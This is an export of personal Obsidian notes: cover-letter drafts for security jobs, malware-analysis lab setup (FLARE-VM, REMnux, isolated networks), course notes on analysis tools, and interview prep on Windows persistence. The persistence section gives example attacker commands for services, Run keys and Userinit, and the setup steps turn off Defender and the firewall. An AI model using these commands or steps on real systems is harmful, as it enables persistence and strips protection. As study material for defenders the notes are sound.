notes.path: obsidian.main.vault/Notes/Intro Cybersecurity.md
notes.content:
What [[cybersecurity]] is to me:

#Cybersecurity to me isn't just a job; it's a way of life, a mindset, and a deep-seated passion that colors how I view everything around me. I don't just use security measures at work; I bring them into my personal life and home network too.

And it's more than just setting up tech safeguards. The way I think about security touches on many parts of my life. Take protecting my own or my family's information, for instance, I go all in with encryption, multi-factor authentication, and several backups for our most private details.

Even when I'm somewhere physically, my mind's always on alert (I thank the Marines for this), scoping out exits for a quick escape. It's better to be safe than sorry. I also don't just take things as they come; I like to dig deeper, ask questions, and do my homework to get the real picture.

What draws me to cybersecurity, or makes me absolutely love it, is its ever-changing nature. New threats and tech pop up all the time, forcing you to stay vigilant, always learning, and on the lookout for the latest info or big security breach to understand what happened and why.

This constant cycle of learning and adapting to this high-stakes field keeps me hooked and driven. I believe that it' the thrill of facing these challenges head-on, being armed with a purpose to safeguard (the American) people and crucial data and systems, that really fuels my passion.




# V2

Cybersecurity to me isn‚Äôt just a job; it‚Äôs a way of life, a mindset, and a deep-seated passion that colors how I view everything around me. I don‚Äôt just use security measures at work‚ÄîI bring them into my personal life and home network too.
  
Additionally, it‚Äôs more than just setting up tech safeguards. The way I think about security touches many parts of my life. Take protecting my own or my family‚Äôs information, for instance. I go all in with encryption, multi-factor authentication, and several backups for our most private details.

Even when I‚Äôm somewhere physically, my mind‚Äôs always on alert (I thank the Marines for this), scoping out exits for a quick escape. It‚Äôs better to be safe than sorry. I also don‚Äôt just take things as they come; I like to dig deeper, ask questions, and do my homework to get the real picture.

What draws me to cybersecurity, or makes me absolutely love it, is its extremely dynamic nature. New threats and tech pop up all the time, forcing you to stay vigilant, always learning, and on the lookout for the latest info or big security breach to understand what happened and why.

This constant cycle of learning and adapting to this high-stakes field keeps me hooked and driven. I believe that it‚Äôs the thrill of facing these challenges head-on, being armed with a purpose to safeguard our customers as well as everyday users, and crucial data and systems, that really fuels my passion.

It truly is this relentless pursuit of cybersecurity excellence that draws me to CrowdStrike. CrowdStrike is known for its cutting-edge technology and commitment to stopping breaches, its bleeding-edge Falcon XDR, and embodies the proactive, innovative security culture that I admire and strive to be a part of. Joining a leader in the industry like CrowdStrike would not only place me at the forefront of cybersecurity but also align perfectly with my personal mission to ensure safety and integrity in the digital world.


## V3
My passion for cybersecurity extends far beyond the workplace. I approach most things with a security-first lens, so to speak. I‚Äôm the person who sets up MFA for my family, encrypts sensitive stuff, and gets curious about how attacks actually work so I can spot them faster.

What keeps me hooked is how fast things change. There‚Äôs always a new tactic or tool, and I like staying on my toes, learning, and putting that knowledge to work to protect people and systems that matter.

I‚Äôm excited about Rapid7 because of the mission and the culture. ‚ÄúBe an Advocate‚Äù really resonates with me‚Äîchallenging the convention, making an impact together, and constant learning. The MDR role fits how I like to work: jump in on real investigations, help customers in the moment, and share what I learn to make detections and products better. The focus on hands‚Äëon detection and response, plus leadership in open source like Metasploit and Velociraptor, lines up with what really motivates me: stop threats and raise the bar for defense.

notes.path: obsidian.main.vault/Malware Analysis/Setting up environment for FlareVM.md
notes.content:
## Commands & Links for this section

In order of how we perform the setup in the video:

- Download Chrome:¬†
```
`[https://www.google.com/chrome/](https://www.google.com/chrome)`
```

Download Windows Terminal:
- Download the VCLibs package. In a PowerShell window, run:¬†
```
`wget https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx -usebasicparsing -o VCLibs.appx`
```

- Download the Windows Terminal MSIX bundle from the provided link:¬†
```
`wget https://github.com/microsoft/terminal/releases/download/v1.15.3465.0/Microsoft.WindowsTerminal_Win10_1.15.3465.0_8wekyb3d8bbwe.msixbundle -UseBasicParsing -o winterminal.msixbundle`
```

 - In a PowerShell admin window, add the VCLibs package:¬†
```
`Add-AppxPackage[C:\path\to\downloaded\VCLibs.appx]`
```

- In a PowerShell admin window, run:¬†
```
`Add-AppxPackage[C:\path\to\downloaded\winterminal.msixbundle]`
```

- (Optional) Pin Windows Terminal to the task bar

- Disable proxy auto detect setting:
    - In the Windows search bar, search ‚Äúproxy settings‚Äù,
    - Switch "Automatically detect settings" button off
- Disable Tamper Protection
    - Search "Defender", open Defender settings and set all Defender Settings to off
- Disable AV/Defender in GPO
    - In Windows search bar, search "group policy"
    - In GPO, navigate to ‚Üí Administrative Templates ‚Üí Windows Components ‚Üí Microsoft Defender Antivirus ‚Üí Enable ‚ÄúTurn off Microsoft Defender Antivirus‚Äù
- Disable Windows Firewall
    - GPO ‚Üí Administrative Templates ‚Üí Network ‚Üí Network Connections ‚Üí Windows Defender Firewall ‚Üí Domain Profile ‚Üí Disable ‚ÄúProtect All Network Connections‚Äù
    - Do the same but for the Standard profile
- TAKE A SNAPSHOT!
- Download and install FLARE-VM:
    - In PowerShell Admin prompt, run:¬†`(New-Object net.webclient).DownloadFile('https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',"$([Environment]::GetFolderPath("Desktop"))\install.ps1")`
    - Change directories to the Desktop
    - Run:¬†`Unblock-File .\install.ps1`
    - Run:¬†`Set-ExecutionPolicy Unrestricted`
    - Accept the prompt to set the ExecPol to unrestricted if one appears
    - Run:¬†`.\install.ps1 -customConfig https://raw.githubusercontent.com/HuskyHacks/PMAT-labs/main/config.xml`
    - Follow the rest of the prompts and continue with the installation.
- When the installation is done, TAKE ANOTHER SNAPSHOT!

## Ensuring VM Connections Are Isolated

## Host-Only Safety

First thing‚Äôs first. I‚Äôd like to get this out of the way immediately:

> The PMAT course‚Äôs Host-Only lab network setup, when followed to the letter,¬†**is safe, has been safe, and will always be safe**¬†for malware analysis during this course! There is no need to setup an Internal Network to complete the course safely. The malware in the course has been designed and/or chosen to be as safe as possible in tandem with this lab set up.

In most circumstances, a Host-Only setup effectively mitigates the risk of a malware sample being able to route out to the greater internet to download second stages or call back to a C2. This comes standard with the design of a Host-Only network.

Consider the following table of VirtualBox network configurations:

![https://www.virtualbox.org/manual/ch06.html](https://cdn.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/https://notes.huskyhacks.dev/_next/image?url=https%3A%2F%2Fassets.super.so%2F0b5aa6c6-a96a-4739-9e6a-96b6a9f9c9b8%2Fimages%2F7a6eaeb5-ed09-4496-bf92-f9cebfb6f864%2FUntitled.png&w=3840&q=80)

In Host-Only mode, a guest VM does not know and cannot see the outer LAN. That‚Äôs good ‚úÖ

But it‚Äôs the VM‚Üí Host and Host ‚Üí VM communication capability represented in the first two columns of the table that tends to concern students. Let‚Äôs examine how this functions and some of the mitigating factors at play.

## Safety Test

Assume that for the following section, I am using the FLAREVM host with a Host-Only network adapter with a configuration that mirrors the course‚Äôs lab network setup configuration. FLAREVM is the host that is used to detonate malware in the course, so we need to make sure it‚Äôs safe for our analysis efforts.

Our first experiment is to start a listening socket in our FLAREVM machine and attempt to reach it with our physical host. For simplicity sake, I‚Äôll use port 80.

On FLAREVM:


```
C:\Users\husky>ncat -nvlp 80
Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:80

```

From my physical host:


```
PS C:\Users\Matt> ncat -nv 10.0.0.4 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.0.0.4:80.
hello!
```

```
C:\Users\husky>ncat -nvlp 80
Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.0.0.1:1343.
hello!
```


Just like the table depicts, we can route from our physical host to our guest VM.

But now, let‚Äôs attempt to do this in reverse. Note that I use a Windows OS for my physical host with a default set of host firewall configuration rules.

On my physical host:


```
PS C:\Users\Matt> ncat.exe -nvlp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
```


From FLAREVM, I can try to access my physical host through its Host-Only adapter IP address, which is 10.0.0.1:


```
C:\Users\husky>ncat -nv 10.0.0.1 80
Ncat: Version 5.59BETA1 ( http://nmap.org/ncat )
Ncat: .
```

```
PS C:\Users\Matt> ncat.exe -nvlp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
```


No connection is established. We can repeat this with our physical host‚Äôs LAN IP and the same thing happens. The Windows¬†**host firewall**¬†has prevented this from occurring. As long as the default firewall settings are configured, no connection will traverse from the guest VM to the host.

So when we think about the risk displayed in the previous test, what do we see? Our physical host can route into our guest VM, but our guest VM cannot route to our physical host because it is blocked by the host firewall.

Is there much risk in our physical host being able to initiate a connection and reach our guest VM? I would say no. Our physical host‚Äôs hypervisor is how we interact with the guest VM, so this represents another way that the hypervisor host can access the guest.¬†**If the opposite were true and the guest VM could initiate a connection to our physical host, it would be riskier.**

If we imagine any malware sample that detonates in FLAREVM and tries to traverse out to our physical host, this traffic will now either:

- be handled and routed to INetSim,
- or, be dropped by the physical host‚Äôs firewall.

## *nix and MacOS

Now, that works well for Windows hosts, but what about a physical host running *nix or MacOS? While it‚Äôs true that these OS do not come standard with a host firewall, the malware in the PMAT course is not designed to be compatible with *nix operating systems. The one exception here is the Android malware sample, but this sample is only examined with static analysis methodology, meaning it is never executed. There are no malware propagation mechanisms in the malware¬†**in this course**¬†that can infect a *nix/MacOS host.

Additionally, *nix and MacOS can use the venerable¬†`iptables`¬†utility to drop traffic that is inbound from the guest VMs.¬†`iptables`¬†is built into the *nix OS and serves as a host firewall:

# iptables -A INPUT -s [IP ADDRESS] -j DROP

If you are using *nix/MacOS for your physical host‚Äôs OS, it may be a good idea (though is not necessary for this course) to implement¬†`iptables`¬†rules for future analysis, especially if you want to analyze malware that is built for *nix. Please see the man page for iptables and¬†[this site](https://docs.rackspace.com/support/how-to/block-an-ip-address-on-a-Linux-server/)¬†for more information.

## Internal Networks

For the final part of this section, I‚Äôd like to offer the steps for how to make an Internal Network for our malware analysis lab.¬†**This is completely optional**¬†and you cannot have an Internal Network and a Host-Only network configured at the same time, so please pick one to configure.

Again, Host-Only is sufficient for this course. The Internal Network provides an additional level of safety that removes the reliance on a host firewall to protect our physical host, so if you are more comfortable implementing it, please feel free to do so.

I want to teach this because it is likely that, during your lucrative career as the world‚Äôs preeminent malware analyst, you‚Äôll be faced with a situation where the risk calculus is such that an Internal Network is the only safe option. In truth, all of my malware analysis work is done with VMworkstation Pro and an Internal Network. While VMworkstation Pro is not available for free, the VirtualBox Internal Network is now sufficiently stable and usable that we can use it in the course.

## Setting Up REMnux

We need to create an Internal Network and associate both VMs to it. We‚Äôll start with REMnux. Perform the following steps to do so.

- Right-click on the REMnux VM and select Settings
- Click on Network
- In the Attached To dropdown menu, select Internal Network
- In VirtualBox, Internal Networks are associated by name. Add a name to the new Internal Network, like ‚Äúpmat-internalnet‚Äù
- Click the drop down arrow next to Advanced to expand the advanced settings
- In the Promiscuous Mode drop down menu, select ‚ÄúAllow VMs‚Äù

Your settings should now look like this:

`![image](https://cdn.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/https://notes.huskyhacks.dev/_next/image?url=https%3A%2F%2Fassets.super.so%2F0b5aa6c6-a96a-4739-9e6a-96b6a9f9c9b8%2Fimages%2Fb60075f3-186b-45cf-9bf4-41048082ed98%2FUntitled.png&w=3840&q=80)   `

Click OK. Then, power on the REMnux guest host by clicking the Start button.

### REMnux Static IP Assignment

There is no DHCP server in the Internal Network, so we need to manually define a static IP address for the REMnux host. We will use the¬†`netplan`¬†utility to do so. The¬†`netplan`¬†utility uses a YAML config file to control the host‚Äôs adapter settings. This YAML config file lives in¬†`/etc/netplan/`

Open the netplan conf file in nano with sudo:

remnux@remnux:~$ sudo nano /etc/netplan/01-netcfg.yaml

  

# This file describes the network interfaces available on your system
# For more information, see netplan(5).
network:
  version: 2
  renderer: networkd
  ethernets:
    enp0s3:
      dhcp4: yes

We want to remove this from DHCP and assign all network information statically.¬†**YAML syntax requires specific code indentation to be processed correctly.**¬†Please pay attention to the amount of spaces for each YAML object.  

Change¬†`dhcpv4`¬†to¬†`no`, add the¬†`addresses`¬†and¬†`gateway4`¬†objects, and configure them with the following values:

yaml

`# This file describes the network interfaces available on your system # For more information, see netplan(5). network: version: 2 renderer: networkd ethernets: enp0s3: dhcp4: no addresses: [10.0.0.3/24] gateway4: 10.0.0.1`

Now, we apply the configuration:

remnux@remnux:~$ sudo netplan apply
remnux@remnux:~$

If no output returns after the¬†`netplan apply`¬†command, the YAML file is formatted correctly and has been processed.

If you get the following error:

remnux@remnux:~$ sudo netplan apply
/etc/netplan/01-netcfg.yaml:10:10: Invalid YAML: inconsistent indentation

‚Ä¶ or:

Invalid YAML at //etc/netplan/01-netcfg.yaml line 7 column 6: did not find expected key

‚Ä¶ that means your YAML syntax is off somewhere. It will show you the line that you need to fix.

We can now inspect the adapter settings on REMnux:

remnux@remnux:~$ ip -br -c a
lo               UNKNOWN        127.0.0.1/8 ::1/128 
enp0s3           UP             10.0.0.3/24 fe80::a00:27ff:feef:67e4/64

## Setting Up FLAREVM

FLAREVM is, believe it or not, a bit more straightforward than REMnux for this setup.

- Right-click on the FLAREVM host and select Settings
- Click on Network
- In the Attached To dropdown menu, select Internal Network
- Associate FLAREVM to the same Internal Network that we made earlier in the setup for REMnux by selecting it from the Name dropdown: ‚Äúpmat-internalnet‚Äù
- Click the drop down arrow next to Advanced to expand the advanced settings
- In the Promiscuous Mode drop down menu, select ‚ÄúAllow VMs‚Äù

Your settings should now look like this:

![image](https://cdn.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/https://notes.huskyhacks.dev/_next/image?url=https%3A%2F%2Fassets.super.so%2F0b5aa6c6-a96a-4739-9e6a-96b6a9f9c9b8%2Fimages%2F6ad3250a-0d52-4057-84a5-04017a050502%2FUntitled.png&w=1920&q=80)

Click OK. Then, power on the FLAREVM guest host by clicking the Start button.

Once you have logged in and are at the FLAREVM desktop, go to the Windows button and enter¬†`View Network Connections`¬†in the search to get to the Network Connection Adapter settings.

Two adapters are present: an¬†`Ethernet Adapter`¬†and the¬†`Npcap Loopback Adapter`. Right click on the Ethernet adapter and select¬†`Properties ‚Üí IPv4 Properties`.

We will now statically define our IPv4 settings to mirror the Host-Only setup. This means that at the end of the day, we want:

- The IPv4 address of FLARE to be set to something. It doesn‚Äôt matter what it‚Äôs set to as long as it‚Äôs a valid address in the¬†`10.0.0.0/24`¬†network and we keep track of it.
- The Subnet Mask to configure a¬†`/24`¬†network.
- Our Default Gateway to be the REMnux host so we can make use of INetSim.
- Our DNS server to be the REMnux host so we can make use of INetSim.

The correct settings look something like this:

![image](https://cdn.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/https://notes.huskyhacks.dev/_next/image?url=https%3A%2F%2Fassets.super.so%2F0b5aa6c6-a96a-4739-9e6a-96b6a9f9c9b8%2Fimages%2F2bc8ada9-ebd2-438b-bcc1-2ce23daab7c0%2FUntitled.png&w=828&q=80)

Once this looks good, select OK and then select OK in the adapter settings window.

Now, examine the IP settings in a cmd prompt:

C:\Users\husky>ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DESKTOP-M87PSAK
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter
   Physical Address. . . . . . . . . : 08-00-27-55-06-07
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::f4fb:f210:ea5a:478f%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.0.0.4(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.0.3
   DHCPv6 IAID . . . . . . . . . . . : 101187623
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-28-B4-6C-F2-08-00-27-55-06-07
   DNS Servers . . . . . . . . . . . : 10.0.0.3
   NetBIOS over Tcpip. . . . . . . . : Enabled

Note the entries for the IP address, subnet mask, default gateway, and DNS server.

## Testing & Troubleshooting

Now, let‚Äôs test our network. Ideally, our network now facilitates communication between FLAREVM and REMnux while also denying traffic to our physical host and beyond. And unlike a Host-Only network, we don‚Äôt need to rely on a host firewall to drop traffic heading for our physical host.

### Test Connectivity Between VMs

The old ping test. Ping the other VM.

On FLAREVM:

C:\Users\husky>ping -n 2 10.0.0.3

Pinging 10.0.0.3 with 32 bytes of data:
Reply from 10.0.0.3: bytes=32 time<1ms TTL=64
Reply from 10.0.0.3: bytes=32 time<1ms TTL=64

Ping statistics for 10.0.0.3:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

On REMnux:

remnux@remnux:~$ ping -c 2 10.0.0.4
PING 10.0.0.4 (10.0.0.4) 56(84) bytes of data.
64 bytes from 10.0.0.4: icmp_seq=1 ttl=128 time=0.308 ms
64 bytes from 10.0.0.4: icmp_seq=2 ttl=128 time=0.321 ms

--- 10.0.0.4 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1020ms
rtt min/avg/max/mdev = 0.308/0.314/0.321/0.006 ms

### Test Outbound Connections

Ensure that our Internal Network is truly isolated with a few tests. Each of these tests should fail which indicates that our network is not routable to our physical host and beyond.

On REMnux:

remnux@remnux:~$ ping -c 2 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
From 10.0.0.3 icmp_seq=1 Destination Host Unreachable
From 10.0.0.3 icmp_seq=2 Destination Host Unreachable

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 1026ms
pipe 2

remnux@remnux:~$ nslookup google.com
Server:		127.0.0.53
Address:	127.0.0.53#53

** server can't find google.com: SERVFAIL

remnux@remnux:~$ ping -c 2 [your physical host's IP address/Wifi address]
PING x.x.x.x (x.x.x.x) 56(84) bytes of data.
From 10.0.0.3 icmp_seq=1 Destination Host Unreachable
From 10.0.0.3 icmp_seq=2 Destination Host Unreachable

--- x.x.x.x ping statistics ---
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 1001ms
pipe 2

  

On FLAREVM, repeat the previous steps.

C:\Users\husky>ping -n 2 8.8.8.8

Pinging 8.8.8.8 with 32 bytes of data:
Request timed out.
Request timed out.

Ping statistics for 8.8.8.8:
    Packets: Sent = 2, Received = 0, Lost = 2 (100% loss),

C:\Users\husky>ping -n 2 google.com
Ping request could not find host google.com. Please check the name and try again.

C:\Users\husky>ping -n 2 [your physical host's IP address/Wifi address]

Pinging x.x.x.x with 32 bytes of data:
Request timed out.
Request timed out.

Ping statistics for x.x.x.x:
    Packets: Sent = 2, Received = 0, Lost = 2 (100% loss),

  

Under certain circumstances, you may see a ping response when pinging a DNS record. Depending on if you have been using the lab and INetSim, this response may be coming from the INetSim DNS resolver. Stopping INetSim, flushing the DNS cache on FLAREVM, and attempting to ping again should fix this:

C:\Users\husky>ping -n 2 google.com

Pinging google.com [10.0.0.3] with 32 bytes of data:
Reply from 10.0.0.3: bytes=32 time<1ms TTL=64
Reply from 10.0.0.3: bytes=32 time<1ms TTL=64

Ping statistics for 10.0.0.3:
    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

...
[On REMnux, stop INetSim wih Ctl+C]
...

C:\Users\husky>ipconfig /flushdns

Windows IP Configuration

Successfully flushed the DNS Resolver Cache.

C:\Users\husky>ping -n 2 google.com
Ping request could not find host google.com. Please check the name and try again

  

### Test INetSim

Use the configuration details from the INetSim setup from PMAT and test to make sure FLAREVM can still access arbitrary DNS records.

Start INetSim on REMnux:

remnux@remnux:~$ inetsim
INetSim 1.3.2 (2020-05-19) by Matthias Eckert & Thomas Hungenberg
Using log directory:      /var/log/inetsim/
Using data directory:     /var/lib/inetsim/
Using report directory:   /var/log/inetsim/report/
Using configuration file: /etc/inetsim/inetsim.conf
Parsing configuration file.
Configuration file parsed successfully.
=== INetSim main process started (PID 1902) ===
Session ID:     1902
Listening on:   10.0.0.3
Real Date/Time: 2022-09-12 06:48:40
Fake Date/Time: 2022-09-12 06:48:40 (Delta: 0 seconds)
 Forking services...
  * dns_53_tcp_udp - started (PID 1906)
  * smtp_25_tcp - started (PID 1909)
  * pop3_110_tcp - started (PID 1911)
  * pop3s_995_tcp - started (PID 1912)
  * smtps_465_tcp - started (PID 1910)
  * ftp_21_tcp - started (PID 1913)
  * https_443_tcp - started (PID 1908)
  * http_80_tcp - started (PID 1907)
  * ftps_990_tcp - started (PID 1914)
 done.
Simulation running.

Use nslookup from FLAREVM for an arbitrary DNS record:

C:\Users\husky>nslookup asdasdasd.com
Server:  www.inetsim.org
Address:  10.0.0.3

Name:    asdasdasd.com
Address:  10.0.0.3

Use a browser to browse to an arbitrary site name:

![image](https://cdn.fs.teachablecdn.com/ADNupMnWyR7kCWRvm76Laz/https://notes.huskyhacks.dev/_next/image?url=https%3A%2F%2Fassets.super.so%2F0b5aa6c6-a96a-4739-9e6a-96b6a9f9c9b8%2Fimages%2F9d9e5f01-74d2-4beb-ae22-ee9a3af28438%2FUntitled.png&w=3840&q=80)


## Bitdefender Firewall rule to DROP ALL INBOUND from 10.0.0.4

![[Screenshot 2024-11-12 203737.png]]
## Conclusion

That concludes this section on Host-Only network safety and creating an Internal Network for our malware analysis lab. You have learned more about the safety considerations of the Host-Only network setup and how to make an Internal Network to apply a greater degree of safety to the lab setup.

Remember, both of these lab network setups are sufficiently safe for this course. Please consider each type of network and what your needs are as a malware analyst for analysis beyond the PMAT course.

notes.path: obsidian.main.vault/Malware Analysis/Course Notes - Guided Intro.md
notes.content:
## Basic malware handling

- Always rename a malware file so it is not executable. For example, if a malware has has "malware.exe", rename it to "malware.exe.malz"
- Standard practice is to password encrypt ALL password specimens
- Standard password is "infected"

## Where to find malware

- Malware can be found at reputable sites on the internet, like github. You do not need to go to the dark web to get malware.
- see [[Malware Samples]]

## Static Analysis - How to fingerprint Malware

- take a sha256sum or md5sum of the malware and search through VirusTotal database
![[VirtualBoxVM_oQxOarmgtR.png]]

```
92730427321a1c4ccfc0d0580834daef98121efa9bb8963da332bfd6cf1fda8a *Malware.Unknown.exe.malz

1d8562c0adcaee734d63f7baaca02f7c *Malware.Unknown.exe.malz
```

##### Strings & FLOSS

![[VirtualBoxVM_qJMRYbIL4Q.png]]

##### FLOSS:
	- `floss Malware.Unknown.exe.malz`
	- the "-n" string can be added to filter string length
##### PEview
Using PEview we can look at the raw data of a malicious file.
![[VirtualBoxVM_hAV6WUMqFZ.png]]

- One of the dead giveaways of a Microsoft portable executable is the "Magic Byte" the first two bytes of a file will start with "**MZ**"
- "**Image file header**" in PEview will tell you when this executable was compiled.
	- Not always a reliable source of truth
- "**Packed Binary**" is when the "raw data" and the "virtual size" of the binary do not closely align. Say that raw data is 5.5k bytes, and the virtual size is 10k bytes, then this binary has some packed or compressed components. 

##### Windows API (Application programing interface)
- When looking at the "IMPORT Address Table" in PEview, you can see the types of API calls the malicious program is trying to make.
<font color="#ffff00">SECTION .rdata ---> IMPORT Address Table</font>
![[VirtualBoxVM_XZ3keRD3zH.png]]

##### Packing - Malware Compression
- Malware is usually packed (using UPX and other software) as an obfuscation technique to try and avoid EDR.
- Basically, malware is compressed and a "stub" header is added during compression.
	-  Once the compressed executable makes it past EDR, (because it's signature is different when compressed), then the "stub" header can inflate the executable to carry out its mission.
<font color="#ffff00">IMAGE_SECTION_HEADER</font>
![[VirtualBoxVM_1NICK0pzaJ.png]]
##### CAPA
Detects malicious capabilities in malware using a set of rules

Usage:
- CD into directory of malware
- `capa malware.exe`
![[brave_eyxf3GkP7c.png]]

	MBC Objective:
		- Translates MITRE ATT&CK refrences into malware analysis focused terms
![[Pasted image 20241114160419.png]]

	From the MBC data, we can denote that this Unknown.Malware.exe is able to send and receive data, download and open files and create and terminate processes.

Capa can also be run in two other modes that provide more and more information using the (-v & -vv) switches

`capa Malware.Unknown.exe.malz -vv`



## Dynamic Analysis
Dynamic analysis provides analysts with detailed insights into malware behavior, revealing "**Host indicators**" and "**Network indicators**." These include file changes and process creation on the host, as well as C2 activity, downloaded files, and similar events in network logs.

Host Indicator examples:
- Deleted file
- Installs persistence
- Event log information

Network Indicator examples:
- C2 activity
- Downloaded file

##### Wireshark
Reference FLOSS output [[VirtualBoxVM_qJMRYbIL4Q.png]]
Network Indicators
![[VirtualBoxVM_H3NUPIBL0V.png]]


##### PROCMON - Process Monitor - Sysinternals
Filtered for process name "Malware.Unkown.exe" and "File" operation
Host Indicator 1 - File created when malware executes
![[Pasted image 20241117151950.png]]

Host indicator 2 - Reference: [[VirtualBoxVM_qJMRYbIL4Q.png]]
![[VirtualBoxVM_hUssNaTHtx.png]]

notes.path: obsidian.main.vault/Job Interview Prep/Rapid7/NCL Screenshots.md
notes.content:
Given a <font color="#ffff00">memdump.mem</font> file

<font color="#ffff00">**<font color="#ffff00">Extracting SAM and SYSTEM hives from memory dump</font></font>**
![[extracting_hives.png]] 

![[2023-11-03_19_52_06-FOR508-SIFT_-_VMware_Workstation.png]]
This is a Volatility 2 (memory forensics) command that dumps process executables from a Windows memory image.

Breakdown:

- vol2.py: Volatility 2 framework script.
- -f memdump.mem: Specifies the memory image file to analyze.
- --profile=win10x64_10240_17770: Tells Volatility the OS profile (Windows 10 x64, build 10240 with patch level 17770) so it can parse structures correctly.
- procdump: The Volatility plugin that extracts in-memory process executables (and related PE sections) from the dump.
- --dump-dir=/cases/art_forensics/art_output/: Directory where the dumped process executables will be saved.

In short: It analyzes the Windows 10 x64 memory image memdump.mem and writes the recovered process binaries to /cases/art_forensics/art_output/.

**<font color="#ffff00">Then I extracted the hashes from the combined HIVES. Interested in the "libera8hacker" user</font>**
![[hashes_extracted.png]]

![[CleanShot 2025-10-14 at 09.56.36.png]]

**<font color="#ffff00">Used MemProcFS.exe to mount the memory dump file</font>**
![[memproc_fs.png]]

![[memprocfs_users.png]]

notes.path: obsidian.main.vault/Job Interview Prep/Rapid7/Interview Prep/Technical/Persistence.md
notes.content:
## Run Key Locations
1. HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 

2. HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run Once

3. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

##### Setting up notepad.exe to load on startup

```Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TestPersistence" -Value "notepad.exe"```
![[CleanShot 2025-10-20 at 13.13.03.png]]


## Scheduled Tasks

**Checking for current SchTasks:** `PS C:\Users\shamby lamby> Get-ScheduledTask | Select-Object TaskName, TaskPath, State | Format-Table -AutoSize`

### Key indicators they're legitimate:
1. **Task Paths**: All are under `\Microsoft\Windows\` or user-specific OneDrive tasks, which is standard for Windows system tasks
2. **Naming conventions**: Follow Microsoft's naming patterns (.NET Framework, Windows Defender, BitLocker, etc.)
3. **Common Windows components**: Include tasks for:
    - Windows Update
    - Windows Defender
    - Disk maintenance (Defrag, Chkdsk)
    - OneDrive sync
    - BitLocker
    - System diagnostics
    - Storage management

### What to watch for (not present here):
- Tasks running scripts from %TEMP%, %APPDATA%, or user directories 
- Tasks with random names or base64-encoded commands
- Tasks that run at suspicious intervals (every minute, at startup)
- Tasks running with SYSTEM privileges that execute user-space binaries
- Tasks in the root `\` path (except OneDrive user tasks)
- Tasks pointing to unusual file locations (check with `Get-ScheduledTask | Get-ScheduledTaskInfo`)
- Tasks created by unknown publishers




### Other Persistence Methods

#### Startup Folder

- What it is: A per-user folder that runs any shortcut or program at login.
- Why attackers use it: Drop a malicious shortcut/exe so it launches every user logon.
- Detect: Monitor additions to the Startup folder; check Autoruns; look for unexpected .lnk or .exe.
- Example: A malware drops evil.lnk in Startup so it runs on every reboot.

#### Windows Services

- What it is: Long‚Äërunning background programs managed by the Service Control Manager.
- Why attackers use it: Create/modify a service to start their binary at boot with SYSTEM rights.
- Detect: Alert on new/modified services, unusual ImagePath, non‚ÄëMicrosoft bin paths, signedness.
- Example: sc create ‚ÄúUpdaterSvc‚Äù binPath= C:\Temp\upd.exe start= auto.

#### WMI Event Subscriptions

- What it is: WMI can trigger scripts/executables when certain system events occur.
- Why attackers use it: ‚ÄúFileless‚Äù persistence‚Äîevil runs on event (e.g., user logon, time).
- Detect: Audit permanent subscriptions (Filter, Consumer, Binding), unusual scripts/commands.
- Example: Trigger PowerShell when a user logs in via a permanent subscription.

#### DLL Hijacking

- What it is: Abusing Windows‚Äô DLL search order so a program loads an attacker DLL first.
- Why attackers use it: Run code inside trusted processes without changing the exe.
- Detect: Look for unsigned DLLs in app directories, DLL loads from writable paths (Sysmon 7).
- Example: Dropping version.dll next to a vulnerable app so it loads the attacker‚Äôs DLL.

#### Winlogon Helper DLLs / Shell Keys

- What it is: Winlogon uses registry values (Userinit, Shell, GINA/Notify) during logon.
- Why attackers use it: Ensure their binary/DLL runs at every logon with high privileges.
- Detect: Monitor HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon values for changes.
- Example: Appending ,C:\Temp\bad.exe to Userinit or replacing Shell from explorer.exe to payload.

#### Browser Extensions

- What it is: Add‚Äëons installed in Chrome/Edge/Firefox that run with the browser.
- Why attackers use it: Persistence + data theft (cookies, credentials) + traffic manipulation.
- Detect: Inventory extensions, flag ones sideloaded from disk, unknown IDs, excessive permissions.
- Example: A malicious Chrome extension exfiltrates session tokens on each browser start.

#### Office Application Startup (Word/Excel)

- What it is: Office loads templates/macros from Startup locations (e.g., Normal.dotm, XLSTART).
